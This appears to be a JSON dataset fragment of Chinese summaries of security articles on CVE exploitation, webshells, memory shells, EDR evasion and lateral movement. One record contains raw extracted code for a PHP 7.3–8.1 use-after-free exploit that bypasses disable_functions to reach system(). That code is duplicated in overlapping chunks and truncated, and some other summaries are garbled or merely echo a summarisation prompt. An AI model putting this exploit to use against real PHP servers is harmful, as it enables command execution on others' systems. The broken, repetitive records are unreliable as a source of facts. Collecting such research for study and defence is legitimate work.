        "page_content": "该文档介绍了如何利用 CVE-2021-3129 漏洞对 Tomcat 服务器进行自动化批量爆破，并提供了两个利用该漏洞的 POC 框架，一个是用于弱口令部署 WAR 包并获取 shell 的 POC，另一个是用于检测 Laravel 框架中是否存在反序列化漏洞的 POC。",
        "FileName": "12561-tomcat自动化批量爆破+CVE-2021-3129+poc框架编写.pdf"
    },
    {
        "page_content": "本文档主题是“从 0 到 1 的虚拟机逃逸三部曲”，内容包括：\n1. 分析文档的主题和内容\n2. 用一段话概括文档",
        "FileName": "7345-从0到1的虚拟机逃逸三部曲.pdf"
    },
    {
        "page_content": "该文档分析了 XStream 组件的历史漏洞，包括 CVE-2013-7285、CVE-2016-3674、CVE-2019-10173、CVE-2020-26217、CVE-2021-21344、CVE-2021-21345、CVE-2021-21346、CVE-2021-21347、CVE-2021-21350、CVE-2021-21351 和 CVE-2021-29505。这些漏洞主要涉及远程代码执行、XXE 和反序列化，影响范围从 1.4.x 到 1.4.16。",
        "FileName": "11372-XSteam历史漏洞分析.pdf"
    },
    {
        "page_content": "该文档主要介绍了某 CMS 系统中的一个代码审计漏洞，该漏洞允许攻击者通过构造恶意 URL 在特定条件下执行时间盲注攻击。攻击者可以通过在 URL 中拼接特定的参数值，在数据库中执行 sleep() 函数，从而导致服务器响应延迟。该漏洞存在于会员模块中，但由于会员功能默认关闭，因此该漏洞的利用价值有限。",
        "FileName": "7985-某CMS代码审计.pdf"
    },
    {
        "page_content": "本文介绍了软件成分分析 (SCA) 的概念和实现方法，通过开源工具 CycloneDX 和 Dependency-Track，可以分析软件项目中使用的第三方组件及其漏洞，从而帮助企业快速识别和修复软件供应链中的安全问题，实现 DevSecOps 的安全自动化。",
        "FileName": "11492-基于开源工具实现软件成分分析SCA.pdf"
    },
    {
        "page_content": "该文档分析了 ThinkPHP 5.1 框架的流程，并展示了如何利用该框架中的 RCE 漏洞。该漏洞允许攻击者通过构造恶意 URL 来执行任意 PHP 代码。文档详细介绍了框架的流程，包括路由解析、控制器实例化和方法调用。它还提供了利用该漏洞的步骤，包括构造恶意 URL 和传递参数。",
        "FileName": "7788-thinkphp 5.1框架流程分析与RCE.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Java 命名和目录接口 (JNDI) 的概念和原理，并通过示例代码演示了如何利用 JNDI 进行远程对象调用和目录服务访问。文档还讨论了 JNDI 中存在的安全漏洞，例如 RMI 和 LDAP 注入，并提供了相应的修复措施。",
        "FileName": "12778-JNDI注入学习.pdf"
    },
    {
        "page_content": "本文档探讨了 Android 渗透测试中绕过 HTTPS 证书校验的方法，包括分析 APK 代码、使用 Xposed 模块、Frida 脚本和伪造证书等技术。通过这些方法，渗透测试人员可以绕过客户端和服务器的证书校验，从而抓取数据包并分析网络流量。",
        "FileName": "8047-Android渗透测试HTTPS证书校验绕过.pdf"
    },
    {
        "page_content": "本文档详细介绍了作者如何通过结合各种漏洞利用，最终进入世界上最大的 ICT 公司的内网。作者首先通过 Github 寻找凭据和内网地址信息，然后使用 Google Hacking 搜索敏感信息。最后，作者利用 CVE-2019-11580 漏洞获得了权限，并通过内网资产信息查询到了一个稳定的 shell，从而成功进入内网。",
        "FileName": "7337-从信息收集到内网漫游.pdf"
    },
    {
        "page_content": "该文档探讨了在 HTML 语境下使用填充符绕过 XSS 过滤器和 WAF 的技术。它定义了填充符的概念，并提供了在标签的不同部分（起始标签、事件处理、等于号、函数名和结束标签）中使用填充符的具体示例。文档还强调了填充符在绕过过滤器和 WAF 中的重要性，并提供了绕过常见过滤规则的示例有效负载。",
        "FileName": "7406-waf && filter bypass系列——XSS之html语境下的填充符探索。.pdf"
    },
    {
        "page_content": "该文档详细介绍了在一次靶场渗透测试中，红队通过利用 bypassuac 提权、smb beacon 横向移动、利用漏洞攻击数据库和域控，最终成功渗透并获取了 9 个 flag。",
        "FileName": "10858-一次略坑靶场渗透（下）.pdf"
    },
    {
        "page_content": "本文档详细介绍了通过 MSSQL 漏洞获取服务器 shell 的多种方法，包括利用 certutil 下载文件、通过命令搜索文件、修改 404 页面、爆破路径、利用 xp_cmdshell 和 sp_oacreate 执行命令、备份数据库、劫持粘滞键等技术，并提供了详细的步骤和示例代码。",
        "FileName": "8603-MSSQL GetShell方法.pdf"
    },
    {
        "page_content": "该文档记录了对 SpringBootCms 代码的审计过程，发现了多个安全漏洞，包括任意文件下载、XSS、越权、目录遍历、任意文件查看和代码写入、任意文件删除等。这些漏洞主要是由于缺乏输入验证、权限控制不当和过滤不严格造成的。",
        "FileName": "12471-SpringBootCms代码审计过程记录.pdf"
    },
    {
        "page_content": "Typora 远程代码执行漏洞（CVE-2023-2317）允许攻击者通过在标签中加载恶意 HTML 代码来在 Typora 主窗口上下文中执行任意 JavaScript 代码，从而导致命令执行。该漏洞源于 Typora 在处理更新检查请求时未对输入进行适当的验证，允许攻击者通过构造恶意请求来注入恶意代码。",
        "FileName": "12822-Typora 远程代码执行漏洞分析（CVE-2023-2317）.pdf"
    },
    {
        "page_content": "本文介绍了如何获得 CNVD 原创漏洞证书，重点关注信息泄露漏洞的挖掘。作者分享了他们获得第一张证书的经验，包括漏洞类型、挖掘思路、漏洞利用和案例分析。作者强调了耐心和细心的重要性，并提供了有关如何收集相关站点和利用源码备份的详细步骤。",
        "FileName": "9569-一起来拿cnvd原创漏洞证书——信息泄露篇(结尾福利).pdf"
    },
    {
        "page_content": "该文档记录了一次对某 CMS 代码的审计过程，审计者通过使用 PHPStorm 和 Xdebug 调试工具，跟踪了漏洞的执行路径，发现漏洞源于控制器中对用户输入的 URL 参数处理不当，导致 SQL 注入漏洞。审计者还介绍了审计环境搭建、CMS 介绍和网站目录结构，并分享了代码审计中使用调试工具的经验。",
        "FileName": "8104-记一次某cms的代码审计.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何渗透一个三层网络域靶场，涉及漏洞搜索、利用、横向移动、权限维持等技术，最终拿下域控权限。",
        "FileName": "9281-自主搭建的三层网络域渗透靶场打靶记录.pdf"
    },
    {
        "page_content": "该文档讨论了 DVWA 中的命令注入漏洞，该漏洞允许攻击者通过注入操作系统命令来执行任意代码。文档分析了漏洞的根源，即服务器端代码未对用户输入进行适当的过滤，并提供了利用该漏洞的示例。文档还介绍了缓解该漏洞的不同方法，包括使用白名单过滤、反 CSRF 令牌和严格的参数验证。",
        "FileName": "12017-DVWA-Command Injection.pdf"
    },
    {
        "page_content": "PHP 的 concat 操作导致的 UAF 利⽤脚本分析 PHP 的 concat 操作导致的 UAF 利⽤脚本分析 L1sper / 2022-05-27 00:01:24 / 浏览数  9016 PHP 7.3-8.1  中字符串连接符中有⼀个错误，当参数为数组时会触发错误处理，如果在错误处理回调中 删除了相关资源，会造成 UAF <?php $my_var \t = \t str_repeat ( \"a\" , \t 1 ); set_error_handler ( \t\t\t\t function () \t use \t ( & $my_var ) \t { \t\t\t\t\t\t\t\t echo ( \"error \\n \" ); \t\t\t\t\t\t\t\t $my_var \t = \t 0x123 ; \t\t\t\t } ); $my_var \t .= \t [ 0 ]; ?> <?php #\tPHP\t7.3-8.1\tdisable_functions\tbypass\tPoC\t(*nix\tonly) # #\tBug:\thttps://bugs.php.net/bug.php?id=81705 #\t #\tThis\texploit\tshould\twork\ton\tall\tPHP\t7.3-8.1\tversions #\treleased\tas\tof\t2022-01-07 # #\tAuthor:\thttps://github.com/mm0r1 new \t Pwn ( \"uname\t-a\" ); class \t Helper \t { \t public \t $a , \t $b , \t $c ; \t } class \t Pwn \t { \t\t\t\t const \t LOGGING \t = \t false ; \t\t\t\t const \t CHUNK_DATA_SIZE \t = \t 0x60 ; \t\t\t\t const \t CHUNK_SIZE \t = \t ZEND_DEBUG_BUILD \t ? \t self :: CHUNK_DATA_SIZE \t + \t 0x20 \t : \t self :: CHUNK_DATA_SIZE ; \t\t\t\t const \t STRING_SIZE \t = \t self :: CHUNK_DATA_SIZE \t - \t 0x18 \t - \t 1 ; \t\t\t\t //\t0x18 是\n2.CHUNK_DATA_SIZE \t + \t 0x20 \t : \t self :: CHUNK_DATA_SIZE ; \t\t\t\t const \t STRING_SIZE \t = \t self :: CHUNK_DATA_SIZE \t - \t 0x18 \t - \t 1 ; \t\t\t\t //\t0x18 是 zend_string 的头⼤⼩ \t\t\t\t const \t HT_SIZE \t = \t 0x118 ; \t\t\t\t const \t HT_STRING_SIZE \t = \t self :: HT_SIZE \t - \t 0x18 \t - \t 1 ; \t\t\t\t public \t function \t __construct ( $cmd ) \t { \t\t\t\t\t\t\t\t for ( $i \t = \t 0 ; \t $i \t < \t 10 ; \t $i ++ ) \t { \t\t\t\t\t\t\t\t\t\t\t\t //\t 分配了两个数组结构，其值指向字符串结构 \t\t\t\t\t\t\t\t\t\t\t\t //\t 这⾥的操作会使得内存池分配 32 个 Bucket 出来，不带索引数组，共计 32*32+8=1032 字节，要分配 24 号规格内存 \t\t\t\t\t\t\t\t\t\t\t\t //\t 为什么要这个操作，不要好像也可以 \t\t\t\t\t\t\t\t\t\t\t\t $groom [] \t = \t self :: alloc ( self :: STRING_SIZE ); \t\t\t\t\t\t\t\t\t\t\t\t $groom [] \t = \t self :: alloc ( self :: HT_STRING_SIZE ); \t\t\t\t\t\t\t\t } \t\t\t\t\t\t\t\t $concat_str_addr \t = \t self :: str2ptr ( $this -> heap_leak (), \t 16 ); 1.  简介 POC exp\t\t\t\t\t\t\t\t //\tconcat_str_addr 是 'Array'+'A'*66 这段字符串 zend_string( 占 95 字节内存 ) 的地址 0x7ffff3a84580 ，这是 concat 产 ⽣的结果。 \t\t\t\t\t\t\t\t //\t 其字符串内容 offset=16 处开始是 $arr 原本的数组的占据的 Bucket 的位置， concat 操作产 ⽣的 result='Array'+'A'*66 的 zval\n3.字节内存 ) 的地址 0x7ffff3a84580 ，这是 concat 产 ⽣的结果。 \t\t\t\t\t\t\t\t //\t 其字符串内容 offset=16 处开始是 $arr 原本的数组的占据的 Bucket 的位置， concat 操作产 ⽣的 result='Array'+'A'*66 的 zval 覆盖了这个位置 \t\t\t\t\t\t\t\t $fill \t = \t self :: alloc ( self :: STRING_SIZE ); \t\t\t\t\t\t\t\t //\t 为啥要这个操作，没有还不⾏ \t\t\t\t\t\t\t\t //\tSTRING_SIZE 能分配到 95 字节的内存空间 \t\t\t\t\t\t\t\t //\t$fill 的 zend_string 地址是 0x7ffff3a84500 \t\t\t\t\t\t\t\t //\t ⼆者⼤⼩相同 , 地址紧挨 , 相距 0x80 \t\t\t\t\t\t\t\t //\t 因为调试时 , 有 ZEND_DEBUG_BUILD 声明 ,95 字节的 zend_string 实际分配到了 11 号规格的内存 , 即相差 0x80 \t\t\t\t\t\t\t\t //\t 为什么 $fill 在 'Array'+'A'*66 的前⾯呢 \t\t\t\t\t\t\t\t printf ( \"0x%x \\n \" , $concat_str_addr ); \t\t\t\t\t\t\t\t $this -> abc \t = \t self :: alloc ( self :: STRING_SIZE ); \t\t\t\t\t\t\t\t var_dump ( $fill ); \t\t\t\t\t\t\t\t $abc_addr \t = \t $concat_str_addr \t + \t self :: CHUNK_SIZE ; \t\t\t\t\t\t\t\t self :: log ( \"abc\t@\t0x%x\" , \t $abc_addr ); \t\t\t\t\t\t\t\t $this -> free ( $abc_addr ); \t\t\t\t\t\t\t\t $this -> helper \t = \t new \t Helper ; \t\t\t\t\t\t\t\t if ( strlen ( $this -> abc ) \t < \t 0x1337 ) \t { \t\t\t\t\t\t\t\t\t\t\t\t self :: log ( \"uaf\tfailed\" ); \t\t\t\t\t\t\t\t\t\t\t\t return ; \t\t\t\t\t\t\t\t }\n4.new \t Helper ; \t\t\t\t\t\t\t\t if ( strlen ( $this -> abc ) \t < \t 0x1337 ) \t { \t\t\t\t\t\t\t\t\t\t\t\t self :: log ( \"uaf\tfailed\" ); \t\t\t\t\t\t\t\t\t\t\t\t return ; \t\t\t\t\t\t\t\t } \t\t\t\t\t\t\t\t $this -> helper -> a \t = \t \"leet\" ; \t\t\t\t\t\t\t\t $this -> helper -> b \t = \t function ( $x ) \t {}; \t\t\t\t\t\t\t\t $this -> helper -> c \t = \t 0xfeedface ; \t\t\t\t\t\t\t\t $helper_handlers \t = \t $this -> rel_read ( 0 ); \t\t\t\t\t\t\t\t self :: log ( \"helper\thandlers\t@\t0x%x\" , \t $helper_handlers ); \t\t\t\t\t\t\t\t $closure_addr \t = \t $this -> rel_read ( 0x20 ); \t\t\t\t\t\t\t\t self :: log ( \"real\tclosure\t@\t0x%x\" , \t $closure_addr ); \t\t\t\t\t\t\t\t $closure_ce \t = \t $this -> read ( $closure_addr \t + \t 0x10 ); \t\t\t\t\t\t\t\t self :: log ( \"closure\tclass_entry\t@\t0x%x\" , \t $closure_ce ); \t\t\t\t\t\t\t\t $basic_funcs \t = \t $this -> get_basic_funcs ( $closure_ce ); \t\t\t\t\t\t\t\t self :: log ( \"basic_functions\t@\t0x%x\" , \t $basic_funcs ); \t\t\t\t\t\t\t\t $zif_system \t = \t $this -> get_system ( $basic_funcs ); \t\t\t\t\t\t\t\t self :: log ( \"zif_system\t@\t0x%x\" , \t $zif_system ); \t\t\t\t\t\t\t\t $fake_closure_off \t = \t 0x70\n5.= \t $this -> get_system ( $basic_funcs ); \t\t\t\t\t\t\t\t self :: log ( \"zif_system\t@\t0x%x\" , \t $zif_system ); \t\t\t\t\t\t\t\t $fake_closure_off \t = \t 0x70 ; \t\t\t\t\t\t\t\t for ( $i \t = \t 0 ; \t $i \t < \t 0x138 ; \t $i \t += \t 8 ) \t { \t\t\t\t\t\t\t\t\t\t\t\t $this -> rel_write ( $fake_closure_off \t + \t $i , \t $this -> read ( $closure_addr \t + \t $i )); \t\t\t\t\t\t\t\t } \t\t\t\t\t\t\t\t $this -> rel_write ( $fake_closure_off \t + \t 0x38 , \t 1 , \t 4 ); \t\t\t\t\t\t\t\t $handler_offset \t = \t PHP_MAJOR_VERSION \t === \t 8 \t ? \t 0x70 \t : \t 0x68 ; \t\t\t\t\t\t\t\t $this -> rel_write ( $fake_closure_off \t + \t $handler_offset , \t $zif_system ); \t\t\t\t\t\t\t\t $fake_closure",
        "FileName": "11380-PHP的concat操作导致的UAF利用脚本分析.pdf"
    },
    {
        "page_content": "Apache Airflow 默认 DAG 中存在命令注入漏洞 (CVE-2020-11978)，该漏洞允许攻击者通过 Web UI 触发 DAG 运行并传递恶意命令，从而绕过默认 DAG 中的配置限制，导致命令执行。",
        "FileName": "8037-Apache Airflow默认DAG导致命令注入分析(CVE-2020-11978).pdf"
    },
    {
        "page_content": "该文档记录了一次对教育网站的渗透测试，发现了多个漏洞，包括信息泄露、任意用户注册、SQL注入、平行越权、存储型跨站脚本（XSS）等。这些漏洞利用了ThinkPHP3框架的默认日志路径、未过滤的XFF参数、未过滤的ID参数以及ueditor编辑器中的XML警报等问题。渗透者通过GitHub搜索找到了一个可登录的邮箱，并利用该邮箱注册了任意用户。他们还利用日志泄露构造了激活链接，绕过了手机验证。此外，他们还发现了平行越权、SQL注入和存储型XSS漏洞，并提供了利用这些漏洞的具体方法。",
        "FileName": "10915-记一次edu渗透.pdf"
    },
    {
        "page_content": "该文档分析了 MuddyWaterAPT 宏病毒，该病毒通过加密宏代码隐藏恶意行为。病毒创建计划任务和批处理文件，执行 PowerShell 脚本，收集系统信息，并与 C2 服务器通信。文档提供了病毒的 IOC 指标、样本分析、解密过程和查杀建议。",
        "FileName": "7389-MuddyWaterAPT之宏病毒分析.pdf"
    },
    {
        "page_content": "该文档记录了一次利用 UE 编辑器漏洞进行文件上传的渗透测试过程。作者通过构造特殊格式的文件名绕过后缀检测，并使用脚本绕过内容检测，最终成功上传文件。文档强调了在渗透测试中导师指导的重要性。",
        "FileName": "10211-记一次文件上传.pdf"
    },
    {
        "page_content": "本文探讨了依赖混淆漏洞，该漏洞允许攻击者通过上传具有内部软件包名称的恶意软件包来劫持依赖关系并远程执行代码。研究人员通过在 npm、PyPI 和 RubyGems 上上传恶意软件包，成功入侵了包括苹果、微软、Shopify 和 Netflix 在内的 35 家组织。该漏洞源于不安全的依赖管理实践，例如错误使用 pip 的 --extra-index-url 参数，以及 JFrog Artifactory 和 Azure Artifacts 等软件包托管服务中易受攻击的算法。",
        "FileName": "9231-不规范的依赖管理我如何入侵苹果，微软和数十家公司(新型供应链攻击的故事).pdf"
    },
    {
        "page_content": "该文档介绍了通过远程线程注入 DLL 的方法，该方法比直接加载 DLL 更具针对性和广泛性。它包含两个程序：一个执行注入操作的 .cpp 文件和一个被注入的 .dll 文件。远程线程负责在目标进程中执行下载操作，而 DLL 的入口点函数负责创建远程线程。文档还提供了提权函数，以避免在某些系统中注入失败。",
        "FileName": "11914-DLL注入学习：通过远程线程注入DLL.pdf"
    },
    {
        "page_content": "该文档介绍了一种利用 Django 中间件在 Django 应用程序中留后门的隐蔽方法。它通过修改 Django 自带的 MessageMiddleware 中间件，在处理请求时执行任意命令，从而实现 webshell 功能。这种方法利用了 Django 中间件在请求生命周期中的作用，修改了默认的中间件代码，在处理响应时执行命令，并返回命令执行结果。",
        "FileName": "11766-一种隐蔽的利用Django中间件（Middleware）留后门的方法.pdf"
    },
    {
        "page_content": "该文档介绍了如何绕过安全狗 Apache 版本 4.0 中的 SQL 注入保护。作者通过使用内联注释、空语句和换行符等技术，演示了如何绕过各种安全狗拦截，包括 and 1=1、order by 和 union select。作者还提供了绕过信息模式架构中获取数据、表和列的示例查询。",
        "FileName": "7572-全方面绕过安全狗注入.pdf"
    },
    {
        "page_content": "该文档介绍了线性同余法 (LCG) 的基础知识，包括其定义、公式和常量。它还提供了四个基本情况的示例，说明如何使用 LCG 算法从已知信息中推导出未知值，例如种子值、增量和模数。",
        "FileName": "12662-LCG入门.pdf"
    },
    {
        "page_content": "本文分析了四个 XSS 漏洞实例，重点关注 CSP（内容安全策略）规则在漏洞利用中的影响。通过这些实例，文章展示了如何利用 CSP 知识、字符长度限制和字符串到函数转换技术来绕过 XSS 防御措施。",
        "FileName": "11805-一些BAT的XSS实例（八）CSP篇.pdf"
    },
    {
        "page_content": "该文档介绍了七种内网穿透的方法，包括正向连接、反向连接、Neo-reGeorg、Venom、ssf、frp和msf，这些方法可以帮助渗透测试人员在拿到边缘机器后访问内网机器。",
        "FileName": "9454-内网穿透的n种姿势.pdf"
    },
    {
        "page_content": "该文档分析了 RealWorld CTF 2020/21 BoxEscape 漏洞复现，涉及 VirtualBox 虚拟机逃逸漏洞，通过访问处理函数、越界读写、地址泄露和命令执行等技术，实现了在 Linux 平台上复现该漏洞。",
        "FileName": "9274-RealWorld CTF 202021 BoxEscape漏洞复现.pdf"
    },
    {
        "page_content": "该文档介绍了一个基于人工智能的网络应用程序防火墙（WAF）的开发过程，包括数据集生成、神经网络训练和两个服务器之间的交互。该WAF使用机器学习技术来识别恶意URL，并根据识别结果采取相应的措施，如禁止访问或发送警告。",
        "FileName": "12552-基于AI的WAF小demo.pdf"
    },
    {
        "page_content": "该文档分析了 GlassFish 中 Filter 内存映射的生成过程，重点关注 filterChain 和 filterConfig 的创建。它提供了获取 WebModule 上下文、加载恶意 Filter 类、注入 Filter 定义和映射的具体实现，并使用 Java 反射和字节码注入技术来实现内存映射的修改。",
        "FileName": "12240-GlassFish内存马分析.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用 ATT&CK 框架在靶场环境中进行 WebLogic 服务器渗透测试，包括环境搭建、信息收集、漏洞利用和权限提升等步骤，并提供了具体的命令和代码示例。",
        "FileName": "11676-红日安全团队ATT&CK(二)实战系列靶场.pdf"
    },
    {
        "page_content": "本文探讨了绕过 D 盾 2.1.6.2 webshell 扫描的各种方法，重点关注利用字符串函数、类和魔术方法、多层包含和注释混淆来实现代码执行。这些方法利用了 PHP 语法的灵活性，通过嵌套不同的代码结构和添加混淆层来绕过扫描。",
        "FileName": "10822-webshell免杀的一点尝试—php5，php7(过d盾2.1.6.2-0105更新版).pdf"
    },
    {
        "page_content": "该文档探讨了 Tomcat WebSocket 内存马的原理，重点介绍了 Tomcat WebSocket 的实现方式，包括注解方式和继承抽象类的方式。它还提供了 WebSocket 内存马的实现步骤，并介绍了检测 WebSocket 内存马的方法。",
        "FileName": "11566-Tomcat WebSocket内存马原理浅析.pdf"
    },
    {
        "page_content": "该文档分析了 Struts2-007 漏洞，这是一个远程代码执行漏洞，影响 Struts 2.0.0 至 2.2.3 版本。该漏洞利用了 OGNL 表达式注入，允许攻击者通过 HTTP 请求执行任意代码。文档提供了漏洞的概要、环境、分析和修复方法，并强调了新版本中使用的过滤机制来防止此类攻击。",
        "FileName": "7971-Java代码审计之Struts2-007(五).pdf"
    },
    {
        "page_content": "该文档详细描述了作者挖掘教育机构网站 edu-src 中漏洞的过程，包括收集子域名、测试登录功能、发现存储型 XSS 漏洞和逻辑漏洞。作者通过修改忘记密码功能中的数据包，将验证码发送到攻击者手机上，从而更改目标账户密码，成功登录网站。",
        "FileName": "10099-记一次挖掘edu-src的过程.pdf"
    },
    {
        "page_content": "这篇文档记录了一次攻防演练，详细描述了作者如何通过信息收集、代码审计和漏洞利用，最终获得了目标网站的权限。文档重点介绍了作者在审计过程中发现的两个关键漏洞：一个任意文件上传漏洞和一个数据导出漏洞，并展示了如何利用这些漏洞获取数据和写入任意文件。",
        "FileName": "10470-记一次攻防演练.pdf"
    },
    {
        "page_content": "本文分析了 JavaScript 原型链污染攻击，并通过多个示例展示了攻击者如何利用原型链污染修改对象的属性，从而执行任意代码或获取敏感信息。文中还提供了防御措施，建议开发者使用严格模式、避免使用不安全的库和函数，并对输入数据进行验证。",
        "FileName": "7293-从几个例子分析JavaScript Prototype 污染攻击.pdf"
    },
    {
        "page_content": "该文档分析了利用 tcache_perthread_struct 结构体劫持 tcache_perthread_struct 结构体和 setcontext 劫持 tcache_perthread_struct 结构体和 setcontext 的登录劫持漏洞，并提供了利用该漏洞的详细流程。",
        "FileName": "12714-劫持tcache_struct与setcontext.pdf"
    },
    {
        "page_content": "本文分析了利用 Spring Devtools 反序列化漏洞进行任意文件读取和命令执行的攻击技术。攻击者通过绕过 URLConnection 的协议限制，利用 Devtools 中的弱 secret 口令，构造恶意 RMI 注册服务和 spring-tx 攻击类，最终通过 JNDI 注入和 ELProcessor 执行任意命令，实现了对目标系统的控制。",
        "FileName": "8349-记一次Spring Devtools反序列化利用.pdf"
    },
    {
        "page_content": "Apereo CAS 4.X 版本中存在一个登录流程执行参数反序列化漏洞，攻击者可利用该漏洞在目标系统上执行任意代码。该漏洞源于对 execution 参数的反序列化处理，攻击者可通过构造恶意参数触发反序列化，从而执行任意 Java 代码。",
        "FileName": "7032-Apereo CAS 4.X execution参数反序列化漏洞分析.pdf"
    },
    {
        "page_content": "该文档分析了 ROME 链分析和 Payload 缩小技术，通过修改 ObjectBean、ToStringBean 和 TemplatesImpl 的属性，逐步缩小序列化数据的体积，最终将 Base64 编码的 Payload 缩小至 1696 字节。",
        "FileName": "10997-ROME链分析与Payload终极缩小-JAVA反序列化.pdf"
    },
    {
        "page_content": "Semgrep 是一款轻量级开源 SAST 工具，以其定制化、极简的规则编写、极快的扫描速度和丰富的生态系统而著称。它支持多种编程语言和框架，并提供自动修复和钩子脚本增强功能。与其他 SAST 工具相比，Semgrep 更专注于编码安全规范违规检测，并提供简单的规则定制和较高的扫描速度，使其非常适合安全编码规范扫描。",
        "FileName": "9531-轻量级开源SAST工具semgrep分析.pdf"
    },
    {
        "page_content": "该文档探讨了在严格的内容安全策略 (CSP) 下执行任意无括号 XSS 的技术。研究人员通过控制回调函数中的方法、发现 Unicode 行终止符、注入任意 HTML 到页面、制作有效载荷以执行任意 XSS 并绕过严格的 CSP，提出了一个解决方案。该解决方案涉及使用反向代理来绕过 CSP，并利用 iframe 中的 setTimeout 功能，即使在 iframe 加载之前也可以在窗口上定义其 onload 事件。",
        "FileName": "8181-无括号XSS任意代码执行.pdf"
    },
    {
        "page_content": "该文档分析了 Apache Dubbo 2.7.8 中的多个远程代码执行漏洞，这些漏洞存在于 HTTP、Redis 和 Dubbo 协议中。攻击者可以通过发送恶意请求来利用这些漏洞，从而在目标系统上执行任意代码。",
        "FileName": "8917-Dubbo 2.7.8多个远程代码执行漏洞.pdf"
    },
    {
        "page_content": "该文档分析了某 CMS 系统的安全性，发现了多个漏洞，包括任意文件删除、任意文件读取、文件上传和修改安全配置上传。这些漏洞允许攻击者删除、读取、上传和修改系统文件，从而可能导致系统被破坏或数据被窃取。",
        "FileName": "10733-某cms审计.pdf"
    },
    {
        "page_content": "该文档分析了 Apache Shiro 1.2.4 及更早版本中的一个反序列化漏洞（CVE-2016-4437），该漏洞允许攻击者通过伪造用户 Cookie 并触发 Java 反序列化来在目标机器上执行任意命令。漏洞的根源在于 Shiro 使用硬编码的 AES 加密密钥，攻击者可以利用该密钥创建恶意对象并将其反序列化，从而导致恶意代码执行。",
        "FileName": "7793-CVE-2016-4437Apache Shiro RememberMe UnSerialized RCE分析.pdf"
    },
    {
        "page_content": "该文档分析了 Fastjson 反序列化漏洞，该漏洞允许攻击者通过反序列化恶意 JSON 数据来执行任意代码。文档详细介绍了漏洞的原理、利用方法和缓解措施，包括使用 Feature.SupportNonPublicField 特性、加载恶意类和利用 JavaBeanInfo 查找 set 和 get 方法。",
        "FileName": "12096-从0到1的fastjson的反序列化漏洞分析.pdf"
    },
    {
        "page_content": "本文档讨论了 Linux 系统中的权限维持技术，包括反弹 shell、SSH 后门、软连接、SSH key、隐藏技术、端口复用、进程注入、后门工具和 rootkit。",
        "FileName": "7338-Linux下的权限维持.pdf"
    },
    {
        "page_content": "该文档探讨了在 Mybatis 持久化框架中可能存在的 SQL 注入漏洞，重点关注了使用 ${} 包裹的参数的可控性。它提供了几个示例，说明了如何通过模糊查询、in 关键字和 order by 子句来利用这些漏洞。文档还提供了修复这些漏洞的建议，例如使用预编译语句或使用 concat() 函数进行模糊匹配。",
        "FileName": "12409-从jshERP来看Mybatis下可能的SQL注入.pdf"
    },
    {
        "page_content": "该文档记录了一次渗透测试，从信息收集开始，通过发现组件安全问题和利用 Linux 和 Windows 文件写入差异性，最终成功获取 Webshell。测试还利用了 Axis1.4 远程命令执行漏洞和 MySQL JDBC XXE 漏洞，并通过 SSRF 请求将恶意方法添加到 Web 服务中，从而实现文件写入和 Webshell 获取。",
        "FileName": "10451-渗透测试-一次从黑盒转向白盒.pdf"
    },
    {
        "page_content": "该文档详细介绍了在内网靶机渗透测试中利用各种漏洞和技术，包括 Laravel RCE、Docker 逃逸、通达 OA 漏洞、Linux 环境变量提权、Redis 未授权访问、Linux sudo 权限提升、SSH 密钥利用、Windows NetLogon 域内权限提升和 MS14-068 漏洞利用，最终成功渗透并控制了内网中的多台主机。",
        "FileName": "10866-内网安全-记一次内网靶机渗透.pdf"
    },
    {
        "page_content": "该文档讨论了越权漏洞，即用户可以访问或操作超出其权限范围的数据或功能。它解释了越权漏洞产生的原因，并提供了水平越权和垂直越权的示例。水平越权涉及修改参数以访问同级用户的信息，而垂直越权涉及使用管理员权限执行操作，即使用户没有这些权限。文档强调了使用最小权限原则、合理权限校验规则和后台登录状态进行权限判断的重要性，以防止越权漏洞。",
        "FileName": "12009-Pikachu靶场-Over Permission.pdf"
    },
    {
        "page_content": "该文档详细介绍了从后门开展应急响应溯源的步骤，包括连接后门、查看日志和漏洞溯源。通过分析访问日志，作者确定了第一个攻击者的 IP 地址，并通过进一步调查，追踪到了最初的入侵者，该入侵者于 2020 年 8 月 28 日获得 shell 后将其出售给其他人。文档还讨论了绕过过滤措施和基于图谱的响应溯源追踪系统的可能性。",
        "FileName": "11103-记一次从后门开展的应急响应溯源.pdf"
    },
    {
        "page_content": "该文档介绍了“反射型 DLL 注入”和“柔性加载”技术，这些技术可以绕过主流 EDR（端点检测和响应）解决方案。通过将恶意代码加载到内存中并使用反射加载器执行，反射型 DLL 注入可以避免使用高风险的远程线程注入技术。柔性加载技术通过混淆和分段写入 shellcode 来进一步规避检测，从而提高了绕过 EDR 的成功率。",
        "FileName": "11659-红队开发基础-基础免杀(四).pdf"
    },
    {
        "page_content": "本文探讨了 Android Webview 组件中存在的远程代码执行漏洞，该漏洞源于 Java 层函数未经适当校验即可被 JavaScript 调用。文章分析了漏洞的成因和影响，并提供了防护建议，包括移除存在漏洞的接口、进行证书校验和完整性校验等。",
        "FileName": "11505-Android Webview漏洞初探.pdf"
    },
    {
        "page_content": "该文档分析了 Weblogic CVE-2020-2551 漏洞在 NAT 网络中的绕过方法，通过修改 IOPProfile 对象中的 host 属性或覆盖 ConnectionKey 对象来实现，从而绕过 NAT 限制，成功反弹 shell。",
        "FileName": "11825-Weblogic CVE-2020-2551 绕过NAT网络分析.pdf"
    },
    {
        "page_content": "该文档主要分析了 D-Link DIR815 路由器中存在的缓冲区溢出漏洞，该漏洞存在于名为 \"hedwig.cgi\" 的 CGI 脚本中。未经身份验证的远程攻击者可以通过向该脚本发送精心设计的 HTTP 请求来触发此漏洞，从而导致路由器的远程代码执行。\n\n该文档详细介绍了漏洞的分析过程，包括调试环境的搭建、漏洞触发函数的定位、偏移量的确定、控制偏移的确定、ROP 链的构建、exp 的编写和漏洞的利用。\n\n此外，该文档还介绍了 Firmadyne 仿真测试的过程，并提供了利用 system 函数和 sleep(1) 函数两种方法获取 shell 的 exp。\n\n总的来说，该文档提供了对 D-Link DIR815 路由器缓冲区溢出漏洞的全面分析和利用方法，对于理解路由器漏洞挖掘技术和利用方法具有参考价值。",
        "FileName": "7827-DIR815缓冲区溢出漏洞再分析.pdf"
    },
    {
        "page_content": "本文档分析了思科 RV110W 路由器中 CVE-2020-3331 和 CVE-2020-3323 漏洞，并提供了利用 qemu-system 模拟启动环境、hook nvram_get 函数、覆盖 s0 和 ra 寄存器、写入 shellcode 等技术细节，最终成功获取路由器 shell 权限。",
